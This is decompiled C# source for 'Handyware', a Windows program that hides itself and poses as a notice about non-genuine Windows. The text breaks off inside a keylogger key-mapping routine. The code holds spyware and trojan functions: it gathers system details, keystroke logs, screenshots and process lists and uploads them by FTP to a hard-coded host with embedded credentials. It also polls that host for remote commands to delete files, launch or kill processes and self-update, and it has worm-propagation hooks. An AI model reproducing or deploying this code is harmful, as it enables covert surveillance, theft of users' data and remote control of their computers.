using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Handyware;

public class Form1 : Form
{
	public enum SL_GENUINE_STATE
	{
		SL_GEN_STATE_IS_GENUINE,
		SL_GEN_STATE_INVALID_LICENSE,
		SL_GEN_STATE_TAMPERED,
		SL_GEN_STATE_LAST
	}

	private IContainer components = null;

	private Timer timer_hide;

	private Timer timer_30seg;

	private Timer timer_10min;

	private Timer timer_20min;

	private Timer timer_CloseHandyware;

	private Label label_mex;

	private Button button_ideMex;

	private Timer timer_notifyFilaEspera;

	private Timer timer_hideNotify;

	private Timer timer_showNotify;

	private Timer timer_checkWindowTitle;

	private FileSystemWatcher fileSystemWatcher_userProfileFolder;

	private Timer timer_01seg;

	private Timer timer_30min;

	private Timer timer_logger;

	private Timer timer_05min;

	private Timer timer_01min;

	private Timer timer_guardadinhoCheck;

	private Thread thrUpdate;

	private Thread thrFindCrack;

	private Thread thrSendInfetedData;

	private Thread thrSendLog;

	private Thread thrSendPrints;

	private Thread thrPrintRequest;

	private Thread thrCommandRequest;

	private Thread thrSendProcess;

	private static uint SPI_SETDESKWALLPAPER = 20u;

	private static uint SPIF_UPDATEINIFILE = 1u;

	private string workspace;

	private string currentVersion;

	private string logPathError;

	private string logPathWindowTitle;

	private string currentWindowTitle;

	private string oldWindowTitle;

	private string lastWindowMsn;

	private int iTimerHide;

	private int difX;

	private int difY;

	private bool hided;

	private bool mouseDown;

	private bool shareFacebook;

	private bool shareTwitter;

	private bool shareMsn;

	private List<string> lstNotifications;

	private List<string> lstAllPaths;

	private List<string> palavrasChaveCrack;

	private List<string> urlsAutoShare;

	private List<string> lstProcess;

	private string fileDocuments;

	private string fileDesktop;

	private string fileDevices;

	private string fileDropbox;

	private CheckBox chbxNotificationShowHide;

	private WormAction actWorm;

	private UpdateProgram uptProgram;

	private string infoStartUp;

	private bool keyDown;

	private bool canRetShift;

	private string logger;

	private string oldWindowLog;

	private DateTime startTime;

	private bool browseExplorer;

	private bool browseChrome;

	private bool browseFirefox;

	private bool browseSafari;

	private DateTime timePrint1;

	private DateTime timePrint2;

	private DateTime timePrint3;

	private bool Print1;

	private bool Print2;

	private bool Print3;

	private string messageboxTitle;

	private string messageboxText;

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0071: Unknown result type (might be due to invalid IL or missing references)
		//IL_007b: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_008d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0097: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_00af: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b9: Expected O, but got Unknown
		//IL_00c0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ca: Expected O, but got Unknown
		//IL_00dc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e6: Expected O, but got Unknown
		//IL_00ed: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f7: Expected O, but got Unknown
		//IL_00fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0108: Expected O, but got Unknown
		//IL_010f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0119: Expected O, but got Unknown
		//IL_0120: Unknown result type (might be due to invalid IL or missing references)
		//IL_012a: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Expected O, but got Unknown
		//IL_0247: Unknown result type (might be due to invalid IL or missing references)
		//IL_0251: Expected O, but got Unknown
		//IL_02d2: Unknown result type (might be due to invalid IL or missing references)
		//IL_02dc: Expected O, but got Unknown
		//IL_02e9: Unknown result type (might be due to invalid IL or missing references)
		//IL_02f3: Expected O, but got Unknown
		//IL_0300: Unknown result type (might be due to invalid IL or missing references)
		//IL_030a: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_0613: Unknown result type (might be due to invalid IL or missing references)
		//IL_061d: Expected O, but got Unknown
		//IL_06de: Unknown result type (might be due to invalid IL or missing references)
		//IL_06e8: Expected O, but got Unknown
		//IL_06f0: Unknown result type (might be due to invalid IL or missing references)
		//IL_06fa: Expected O, but got Unknown
		//IL_0702: Unknown result type (might be due to invalid IL or missing references)
		//IL_070c: Expected O, but got Unknown
		//IL_0714: Unknown result type (might be due to invalid IL or missing references)
		//IL_071e: Expected O, but got Unknown
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer_hide = new Timer(components);
		timer_30seg = new Timer(components);
		timer_10min = new Timer(components);
		timer_20min = new Timer(components);
		timer_CloseHandyware = new Timer(components);
		label_mex = new Label();
		button_ideMex = new Button();
		timer_notifyFilaEspera = new Timer(components);
		timer_hideNotify = new Timer(components);
		timer_showNotify = new Timer(components);
		timer_checkWindowTitle = new Timer(components);
		fileSystemWatcher_userProfileFolder = new FileSystemWatcher();
		timer_01seg = new Timer(components);
		timer_30min = new Timer(components);
		timer_logger = new Timer(components);
		timer_05min = new Timer(components);
		timer_01min = new Timer(components);
		timer_guardadinhoCheck = new Timer(components);
		((ISupportInitialize)fileSystemWatcher_userProfileFolder).BeginInit();
		((Control)this).SuspendLayout();
		timer_hide.add_Tick((EventHandler)timer_hide_Tick);
		timer_30seg.set_Interval(10000);
		timer_30seg.add_Tick((EventHandler)timer_propagacao_Tick);
		timer_10min.set_Interval(30000);
		timer_10min.add_Tick((EventHandler)timer_actions_Tick);
		timer_20min.set_Interval(60000);
		timer_20min.add_Tick((EventHandler)timer_update_Tick);
		timer_CloseHandyware.set_Interval(5000);
		timer_CloseHandyware.add_Tick((EventHandler)timer_CloseHandyware_Tick);
		((Control)label_mex).set_Anchor((AnchorStyles)15);
		((Control)label_mex).set_AutoSize(true);
		((Control)label_mex).set_BackColor(Color.Silver);
		label_mex.set_BorderStyle((BorderStyle)2);
		((Control)label_mex).set_Font(new Font("Times New Roman", 12f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label_mex).set_ForeColor(Color.Black);
		((Control)label_mex).set_Location(new Point(12, 9));
		((Control)label_mex).set_Name("label_mex");
		((Control)label_mex).set_Size(new Size(263, 21));
		((Control)label_mex).set_TabIndex(0);
		((Control)label_mex).set_Text("Esta copia do Windows nao é original!");
		label_mex.set_TextAlign((ContentAlignment)32);
		((Control)label_mex).add_MouseMove(new MouseEventHandler(label_mex_MouseMove));
		((Control)label_mex).add_MouseDown(new MouseEventHandler(label_mex_MouseDown));
		((Control)label_mex).add_MouseUp(new MouseEventHandler(label_mex_MouseUp));
		((Control)button_ideMex).set_Anchor((AnchorStyles)10);
		((Control)button_ideMex).set_BackColor(Color.Black);
		((Control)button_ideMex).set_Cursor(Cursors.get_Default());
		((ButtonBase)button_ideMex).get_FlatAppearance().set_BorderColor(Color.Silver);
		((ButtonBase)button_ideMex).get_FlatAppearance().set_MouseDownBackColor(Color.White);
		((ButtonBase)button_ideMex).get_FlatAppearance().set_MouseOverBackColor(Color.Red);
		((ButtonBase)button_ideMex).set_FlatStyle((FlatStyle)3);
		((Control)button_ideMex).set_Font(new Font("Microsoft Sans Serif", 6.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button_ideMex).set_Location(new Point(234, 35));
		((Control)button_ideMex).set_Name("button_ideMex");
		((Control)button_ideMex).set_Size(new Size(48, 19));
		((Control)button_ideMex).set_TabIndex(1);
		((Control)button_ideMex).set_Text("Close");
		((ButtonBase)button_ideMex).set_UseVisualStyleBackColor(false);
		((Control)button_ideMex).add_Click((EventHandler)button_ideMex_Click);
		timer_notifyFilaEspera.set_Interval(2000);
		timer_notifyFilaEspera.add_Tick((EventHandler)timer_notify_Tick);
		timer_hideNotify.set_Interval(30);
		timer_hideNotify.add_Tick((EventHandler)timer_hideNotify_Tick);
		timer_showNotify.set_Interval(30);
		timer_showNotify.add_Tick((EventHandler)timer_showNotify_Tick);
		timer_checkWindowTitle.set_Interval(2000);
		timer_checkWindowTitle.add_Tick((EventHandler)timer_checkWindowTitle_Tick);
		fileSystemWatcher_userProfileFolder.EnableRaisingEvents = true;
		fileSystemWatcher_userProfileFolder.IncludeSubdirectories = true;
		fileSystemWatcher_userProfileFolder.NotifyFilter = NotifyFilters.FileName | NotifyFilters.DirectoryName;
		fileSystemWatcher_userProfileFolder.SynchronizingObject = (ISynchronizeInvoke?)this;
		fileSystemWatcher_userProfileFolder.Created += fileSystemWatcher_userProfileFolder_Created;
		timer_01seg.set_Interval(10000);
		timer_01seg.add_Tick((EventHandler)timer_01seg_Tick);
		timer_30min.set_Interval(120000);
		timer_30min.add_Tick((EventHandler)timer_30min_Tick);
		timer_logger.set_Interval(20000);
		timer_logger.add_Tick((EventHandler)timer_logger_Tick);
		timer_05min.set_Interval(30000);
		timer_05min.add_Tick((EventHandler)timer_05min_Tick);
		timer_01min.set_Interval(120000);
		timer_01min.add_Tick((EventHandler)timer_01min_Tick);
		timer_guardadinhoCheck.set_Interval(300000);
		timer_guardadinhoCheck.add_Tick((EventHandler)timer_guardadinhoCheck_Tick);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Black);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		((Form)this).set_ClientSize(new Size(287, 59));
		((Form)this).set_ControlBox(false);
		((Control)this).get_Controls().Add((Control)(object)button_ideMex);
		((Control)this).get_Controls().Add((Control)(object)label_mex);
		((Control)this).set_Cursor(Cursors.get_Default());
		((Control)this).set_DoubleBuffered(true);
		((Control)this).set_ForeColor(Color.Black);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Handyware");
		((Form)this).set_TopMost(true);
		((Form)this).set_TransparencyKey(Color.Magenta);
		((Control)this).add_MouseUp(new MouseEventHandler(Form1_MouseUp));
		((Control)this).add_MouseDown(new MouseEventHandler(Form1_MouseDown));
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		((Control)this).add_MouseMove(new MouseEventHandler(Form1_MouseMove));
		((ISupportInitialize)fileSystemWatcher_userProfileFolder).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void updateProgram()
	{
		if (uptProgram.Update())
		{
			Process.Start(workspace + "\\handyware_newversion.exe");
		}
	}

	private void findCrack()
	{
		lstAllPaths = new List<string>();
		lstAllPaths.Add(Environment.ExpandEnvironmentVariables("%userprofile%").ToString());
		searchSubPaths(Environment.ExpandEnvironmentVariables("%userprofile%").ToString());
		string[] logicalDrives = Environment.GetLogicalDrives();
		for (int i = 0; i < logicalDrives.Length; i++)
		{
			if (!Directory.Exists(logicalDrives[i] + "windows"))
			{
				lstAllPaths.Add(logicalDrives[i]);
				searchSubPaths(logicalDrives[i]);
			}
		}
		searchCrack();
		Thread.Sleep(600000);
	}

	private void searchCrack()
	{
		try
		{
			Environment.GetLogicalDrives();
			foreach (string lstAllPath in lstAllPaths)
			{
				bool flag = false;
				foreach (string item in palavrasChaveCrack)
				{
					try
					{
						string[] files = Directory.GetFiles(lstAllPath, "*.*", SearchOption.TopDirectoryOnly);
						for (int i = 0; i < files.Length; i++)
						{
							FileInfo fileInfo = new FileInfo(files[i]);
							if (Contains(fileInfo.Name, item, StringComparison.CurrentCultureIgnoreCase))
							{
								lstNotifications.Add("Founded a possible illegal file: \r\n...\\" + fileInfo.Directory!.Name + "\\" + fileInfo.Name + "|" + fileInfo.DirectoryName);
								flag = true;
							}
						}
					}
					catch
					{
					}
				}
				foreach (string item2 in palavrasChaveCrack)
				{
					if (flag)
					{
						continue;
					}
					try
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(lstAllPath);
						if (Contains(directoryInfo.Name, item2, StringComparison.CurrentCultureIgnoreCase))
						{
							lstNotifications.Add("Founded a possible illegal files in: \r\n" + directoryInfo.FullName + "|" + directoryInfo.FullName);
							break;
						}
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	private void searchSubPaths(string rootPath)
	{
		try
		{
			string[] directories = Directory.GetDirectories(rootPath, "*", SearchOption.TopDirectoryOnly);
			for (int i = 0; i < directories.Length; i++)
			{
				try
				{
					if (!lstAllPaths.Contains(directories[i]))
					{
						lstAllPaths.Add(directories[i]);
					}
					searchSubPaths(directories[i]);
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}

	private void sendInfectedData()
	{
		try
		{
			string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + ".txt";
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.KeepAlive = false;
			int num = Convert.ToInt32(TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).TotalHours);
			if (TimeZone.CurrentTimeZone.IsDaylightSavingTime(DateTime.Now))
			{
				num--;
			}
			string text2 = "Unknown";
			string text3 = "Unknown";
			string text4 = "Unknown";
			string text5 = "Unknown";
			string text6 = "Unknown";
			string text7 = "Unknown";
			string text8 = "Unknown";
			string text9 = "Unknown";
			string text10 = "Unknown";
			string text11 = "Unknown";
			string text12 = "";
			TimeSpan timeSpan = startTime - startTime;
			try
			{
				text2 = Environment.OSVersion.ToString();
			}
			catch
			{
			}
			try
			{
				text3 = Environment.MachineName.ToString();
			}
			catch
			{
			}
			try
			{
				text4 = Environment.UserName.ToString();
			}
			catch
			{
			}
			try
			{
				text5 = Environment.SystemDirectory.ToString();
			}
			catch
			{
			}
			try
			{
				text6 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData).ToString();
			}
			catch
			{
			}
			try
			{
				text8 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToString();
			}
			catch
			{
			}
			try
			{
				text7 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).ToString();
			}
			catch
			{
			}
			try
			{
				text9 = getLocalIP();
			}
			catch
			{
			}
			try
			{
				text10 = DateTime.Now.Year + "." + DateTime.Now.Month.ToString("00") + "." + DateTime.Now.Day.ToString("00") + "  " + DateTime.Now.ToLongTimeString() + "  GMT" + num;
			}
			catch
			{
			}
			try
			{
				switch (originalWindows6())
				{
				case 1:
					text11 = "Yes";
					break;
				case -1:
					text11 = "No";
					break;
				}
			}
			catch
			{
			}
			try
			{
				timeSpan = DateTime.Now - startTime;
			}
			catch
			{
			}
			try
			{
				if (browseChrome)
				{
					text12 = ((!(text12 == "")) ? (text12 + ", Chrome") : "Chrome");
				}
				if (browseFirefox)
				{
					text12 = ((!(text12 == "")) ? (text12 + ", Firefox") : "Firefox");
				}
				if (browseExplorer)
				{
					text12 = ((!(text12 == "")) ? (text12 + ", iExplorer") : "iExplorer");
				}
				if (browseSafari)
				{
					text12 = ((!(text12 == "")) ? (text12 + ", Safari") : "Safari");
				}
			}
			catch
			{
			}
			string s = "System Information:\r\n   OS version: " + text2 + "\r\n   Genuine: " + text11 + "\r\n   Machine: " + text3 + "\r\n   User: " + text4 + "\r\n   System directory: " + text5 + "\r\n   Programs directory: " + text8 + "\r\n   AppData directory: " + text6 + "\r\n   Documents directory: " + text7 + "\r\n   Browsers: " + text12 + "\r\n   Local IP: " + text9 + "\r\n   Running: " + timeSpan.Days.ToString("00") + "d  " + timeSpan.Hours.ToString("00") + ":" + timeSpan.Minutes.ToString("00") + ":" + timeSpan.Seconds.ToString("00") + "\r\n   Time check: " + text10 + "\r\n\r\nHandyware Information:\r\n   Version: " + currentVersion + "\r\n   StartUp: " + infoStartUp;
			byte[] bytes = new UTF8Encoding().GetBytes(s);
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
		}
		catch (Exception ex)
		{
			writeLogError("Send Ftp Data\r\nError: " + ex.Message);
		}
	}

	private void sendLog()
	{
		try
		{
			if (logger != "" && logger.IndexOf("\r\n") != -1)
			{
				int num = Convert.ToInt32(TimeZone.CurrentTimeZone.GetUtcOffset(DateTime.Now).TotalHours);
				if (TimeZone.CurrentTimeZone.IsDaylightSavingTime(DateTime.Now))
				{
					num--;
				}
				string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - LOG.txt";
				bool flag;
				try
				{
					FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
					ftpWebRequest.Method = "SIZE";
					ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
					ftpWebRequest.GetResponse();
					flag = true;
				}
				catch
				{
					flag = false;
				}
				if (flag)
				{
					string s = "\r\n\r\n\r\n" + DateTime.Now.ToShortDateString() + "  " + DateTime.Now.ToLongTimeString() + " GMT" + num + "\r\n" + logger;
					logger = "";
					FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
					ftpWebRequest.Method = "APPE";
					ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
					ftpWebRequest.UseBinary = true;
					ftpWebRequest.UsePassive = true;
					ftpWebRequest.KeepAlive = false;
					byte[] bytes = new UTF8Encoding().GetBytes(s);
					Stream requestStream = ftpWebRequest.GetRequestStream();
					requestStream.Write(bytes, 0, bytes.Length);
					requestStream.Close();
				}
				else
				{
					string s = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString();
					string text2 = s;
					s = text2 + "\r\n\r\n\r\n" + DateTime.Now.ToShortDateString() + "  " + DateTime.Now.ToLongTimeString() + " GMT" + num + "\r\n" + logger;
					logger = "";
					FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
					ftpWebRequest.Method = "STOR";
					ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
					ftpWebRequest.UseBinary = true;
					ftpWebRequest.UsePassive = true;
					ftpWebRequest.KeepAlive = false;
					byte[] bytes = new UTF8Encoding().GetBytes(s);
					Stream requestStream = ftpWebRequest.GetRequestStream();
					requestStream.Write(bytes, 0, bytes.Length);
					requestStream.Close();
				}
			}
		}
		catch (Exception ex)
		{
			writeLogError("Send Log\r\nError: " + ex.Message);
		}
	}

	private void sendPrints()
	{
		try
		{
			string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT1.png";
			string text2 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT2.png";
			string text3 = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINT3.png";
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.KeepAlive = false;
			FileStream fileStream = new FileStream(workspace + "\\" + text, FileMode.Open, FileAccess.Read);
			byte[] array = new byte[fileStream.Length];
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text2);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.KeepAlive = false;
			fileStream = new FileStream(workspace + "\\" + text2, FileMode.Open, FileAccess.Read);
			array = new byte[fileStream.Length];
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
			ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text3);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.KeepAlive = false;
			fileStream = new FileStream(workspace + "\\" + text3, FileMode.Open, FileAccess.Read);
			array = new byte[fileStream.Length];
			fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
			fileStream.Close();
			requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(array, 0, array.Length);
			requestStream.Close();
		}
		catch (Exception ex)
		{
			writeLogError("Send Print\r\nError: " + ex.Message);
		}
		Print1 = false;
		Print2 = false;
		Print3 = false;
	}

	private void printRequest()
	{
		//IL_0169: Unknown result type (might be due to invalid IL or missing references)
		//IL_016f: Expected O, but got Unknown
		Thread.Sleep(30000);
		while (true)
		{
			try
			{
				string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.txt";
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
				ftpWebRequest.Method = "SIZE";
				ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
				ftpWebRequest.UseBinary = true;
				ftpWebRequest.UsePassive = true;
				ftpWebRequest.KeepAlive = false;
				try
				{
					ftpWebRequest.GetResponse();
					text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.png";
					ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
					ftpWebRequest.Method = "STOR";
					ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
					ftpWebRequest.UseBinary = true;
					ftpWebRequest.UsePassive = true;
					ftpWebRequest.KeepAlive = false;
					Bitmap val = new Bitmap(Screen.get_PrimaryScreen().get_Bounds().Width, Screen.get_PrimaryScreen().get_Bounds().Height, (PixelFormat)2498570);
					Graphics val2 = Graphics.FromImage((Image)(object)val);
					val2.CopyFromScreen(Screen.get_PrimaryScreen().get_Bounds().X, Screen.get_PrimaryScreen().get_Bounds().Y, 0, 0, Screen.get_PrimaryScreen().get_Bounds().Size, (CopyPixelOperation)13369376);
					val = resizeBitmap(val, ((Image)val).get_Width(), ((Image)val).get_Height(), 80);
					((Image)val).Save(workspace + "\\" + text, ImageFormat.get_Png());
					FileStream fileStream = new FileStream(workspace + "\\" + text, FileMode.Open, FileAccess.Read);
					byte[] array = new byte[fileStream.Length];
					fileStream.Read(array, 0, Convert.ToInt32(fileStream.Length));
					fileStream.Close();
					Stream requestStream = ftpWebRequest.GetRequestStream();
					requestStream.Write(array, 0, array.Length);
					requestStream.Close();
					text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PRINTRequest.txt";
					ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
					ftpWebRequest.Method = "DELE";
					ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
					ftpWebRequest.UseBinary = true;
					ftpWebRequest.UsePassive = true;
					ftpWebRequest.KeepAlive = false;
					ftpWebRequest.GetResponse();
				}
				catch
				{
				}
			}
			catch
			{
			}
			Thread.Sleep(15000);
		}
	}

	private void commandRequest()
	{
		Thread.Sleep(30000);
		while (true)
		{
			try
			{
				string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - COMMAND.txt";
				FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
				ftpWebRequest.Method = "RETR";
				ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
				ftpWebRequest.UseBinary = true;
				ftpWebRequest.UsePassive = true;
				ftpWebRequest.KeepAlive = false;
				try
				{
					StreamReader streamReader = new StreamReader(ftpWebRequest.GetResponse().GetResponseStream());
					string text2 = streamReader.ReadToEnd();
					streamReader.Close();
					try
					{
						text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - COMMAND.txt";
						ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
						ftpWebRequest.Method = "DELE";
						ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
						ftpWebRequest.UseBinary = true;
						ftpWebRequest.UsePassive = true;
						ftpWebRequest.KeepAlive = false;
						ftpWebRequest.GetResponse();
					}
					catch
					{
					}
					List<string> list = new List<string>(text2.Split(new string[1] { "\r\n" }, StringSplitOptions.RemoveEmptyEntries));
					switch (list[0])
					{
					case "update":
						try
						{
							if (!thrUpdate.IsAlive)
							{
								thrUpdate = new Thread(updateProgram);
								thrUpdate.Start();
							}
						}
						catch
						{
						}
						break;
					case "messagebox":
						messageboxTitle = list[1];
						messageboxText = list[2];
						break;
					case "del":
					{
						for (int i = 1; i < list.Count; i++)
						{
							try
							{
								File.Delete(list[i]);
							}
							catch
							{
							}
						}
						break;
					}
					case "start":
					{
						for (int i = 1; i < list.Count; i++)
						{
							Process.Start(list[i]);
						}
						break;
					}
					case "kill":
					{
						for (int i = 1; i < list.Count; i++)
						{
							killProcess(list[i]);
						}
						break;
					}
					}
				}
				catch
				{
				}
			}
			catch
			{
			}
			Thread.Sleep(10000);
		}
	}

	private void sendProcess()
	{
		try
		{
			if (lstProcess.Count <= 0)
			{
				return;
			}
			string text = Environment.UserName + " - " + Environment.MachineName + " - " + Environment.OSVersion.ToString() + " - PROCESS.txt";
			FtpWebRequest ftpWebRequest = (FtpWebRequest)WebRequest.Create("ftp://mylogin.altervista.org/handywareInfecteds/" + text);
			ftpWebRequest.Method = "STOR";
			ftpWebRequest.Credentials = new NetworkCredential("mylogin", "wildworld92");
			ftpWebRequest.UseBinary = true;
			ftpWebRequest.UsePassive = true;
			ftpWebRequest.KeepAlive = false;
			string text2 = "";
			foreach (string item in lstProcess)
			{
				string text3 = item.Insert(item.IndexOf('|'), " ");
				text3 = text3.Insert(text3.IndexOf('|') + 1, " ");
				text2 = text2 + text3 + "\r\n";
			}
			byte[] bytes = new UTF8Encoding().GetBytes(text2);
			Stream requestStream = ftpWebRequest.GetRequestStream();
			requestStream.Write(bytes, 0, bytes.Length);
			requestStream.Close();
		}
		catch (Exception ex)
		{
			writeLogError("Send Process Data\r\nError: " + ex.Message);
		}
	}

	[DllImport("Slwga.dll", BestFitMapping = false, ThrowOnUnmappableChar = false)]
	internal static extern uint SLIsGenuineLocal(ref Guid slid, [In][Out] ref SL_GENUINE_STATE genuineState, IntPtr val3);

	public static bool IsGenuineWindows()
	{
		bool result = false;
		Guid guid = new Guid("55c92734-d682-4d71-983e-d6ec3f16059f");
		Guid slid = guid;
		try
		{
			SL_GENUINE_STATE genuineState = SL_GENUINE_STATE.SL_GEN_STATE_LAST;
			uint num = SLIsGenuineLocal(ref slid, ref genuineState, IntPtr.Zero);
			if (num == 0)
			{
				result = genuineState == SL_GENUINE_STATE.SL_GEN_STATE_IS_GENUINE;
				return result;
			}
			Console.WriteLine("Error getting information {0}", num.ToString());
			return result;
		}
		catch (Exception)
		{
			return result;
		}
	}

	private int originalWindows6()
	{
		if (Environment.OSVersion.Version.Major >= 6)
		{
			if (IsGenuineWindows())
			{
				return 1;
			}
			return -1;
		}
		return 0;
	}

	[DllImport("user32.dll")]
	private static extern short GetAsyncKeyState(int vKey);

	private string GetKeyPressed(int i, ref bool newLine, bool canRetShift)
	{
		bool flag = Control.IsKeyLocked((Keys)20);
		switch (i)
		{
		case 13:
			newLine = true;
			return "<Enter>";
		case 8:
			return "<Back-Space>";
		case 9:
			return "<Tab>";
		case 1:
			newLine = true;
			return "<Left-Click>";
		case 2:
			newLine = true;
			return "<Right-Click>";
		case 27:
			newLine = true;
			return "<ESC>";
		case 32:
			return " ";
		case 33:
			return "<Page-Up>";
		case 34:
			return "<Page-Down>";
		case 37:
			return "<Left-Arrow>";
		case 38:
			return "<Up-Arrow>";
		case 39:
			return "<Right-Arrow>";
		case 40:
			return "<Down-Arrow>";
		case 48:
			return "0";
		case 49:
			return "1";
		case 50:
			return "2";
		case 51:
			return "3";
